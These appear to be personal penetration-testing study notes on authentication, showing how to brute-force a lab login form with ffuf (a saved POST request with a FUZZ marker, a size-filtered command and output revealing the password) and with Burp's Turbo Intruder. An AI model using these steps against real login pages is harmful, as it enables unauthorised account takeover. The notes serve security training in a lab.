## Introduction to Authentication

Authentication - Who you are
Authorization - What you have access to

## Brute-force Attacks

- [!] There are different tools that you can use to initiate a bruteforce attack, however here are two examples using burpsuite and ffuf
#### Using ffuf

- Save the request into a file via burp

```
POST /labs/a0x01.php HTTP/1.1
Host: 192.168.149.128
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

username=jeremy&password=FUZZ
```

- Make sure to replace the position you want to bruteforce with the `FUZZ` keyword
- Bruteforce Jeremy's password using ffuf:

`ffuf -request req.txt -request-proto http -w /path/to/wordlist -fs 1814`

- We get one that does not have a response size of 1814:

`letmein [Status: 200, Size: 1808, Words: 494, Lines: 47, Duration: 16ms]`

#### Using Burp Extension Turbo Intruder

- First install the Turbo Intruder extension on Burp
- Now select the position that you want to bruteforce and send it to Turbo Intruder:

- You can see that the position chosen to fuzz is replaced with `%s`
- Within the python code, replace the wordlist with the one of your choice:

![[turbo_intruder2.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/turbo_intruder2.png">

- Then initiate the attack and you should see that it gives you the successful request, indicating that we successfully bruteforced Jeremy's password
